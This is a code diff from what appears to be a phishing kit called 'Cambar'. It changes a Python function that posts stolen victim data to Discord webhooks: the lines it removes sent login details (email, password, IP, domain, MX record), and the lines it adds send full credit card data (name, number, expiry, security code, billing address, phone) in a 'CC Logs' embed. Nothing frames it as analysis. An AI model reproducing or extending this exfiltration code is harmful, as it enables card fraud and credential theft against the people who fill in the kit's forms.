@@ -27,20 +27,26 @@ DISCORD_WEBHOOK_URLS = [
 def send_discord_message(cardholder_name, card_number, expiration_date, security_code, billing_address, city, state, zip_code, country, phone_number, email, useragent):
     webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
     message = {
-        "username": "Cambar Logs",
+        "username": "Cambar CC",
         "embeds": [
             {
-                "title": "🔔 CAMBAR Login⭐⭐⭐",
+                "title": "🔔 CAMBAR CC Logs⭐⭐⭐",
                 "color": 16711680,  # Red color in Discord embed
                 "fields": [
+                    {"name": "👤 Cardholder Name", "value": f"`{cardholder_name}`", "inline": False},
+                    {"name": "💳 Card Number", "value": f"`{card_number}`", "inline": False},
+                    {"name": "📅 Expiration Date", "value": f"`{expiration_date}`", "inline": False},
+                    {"name": "🔒 Security Code", "value": f"`{security_code}`", "inline": False},
+                    {"name": "🏠 Billing Address", "value": f"`{billing_address}`", "inline": False},
+                    {"name": "🏙️ City", "value": f"`{city}`", "inline": False},
+                    {"name": "🗺️ State", "value": f"`{state}`", "inline": False},
+                    {"name": "📮 ZIP Code", "value": f"`{zip_code}`", "inline": False},
+                    {"name": "🌍 Country", "value": f"`{country}`", "inline": False},
+                    {"name": "📞 Phone Number", "value": f"`{phone_number}`", "inline": False},
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
-                    {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
-                    {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
-                    {"name": "🖥 User-Agent", "value": f"`{useragent}`", "inline": False},
-                    {"name": "🌍 Domain", "value": f"`{domain}`", "inline": False},
-                    {"name": "📨 MX Record", "value": f"`{mx_record}`", "inline": False},
+                    {"name": "🖥️ User-Agent", "value": f"`{useragent}`", "inline": False},
                 ],
-                "footer": {"text": "Cambar Logs - Secure Notifications⭐⭐⭐"},
+                "footer": {"text": "Cambar CC - Secure Notifications⭐⭐⭐"},
             }
         ]
     }
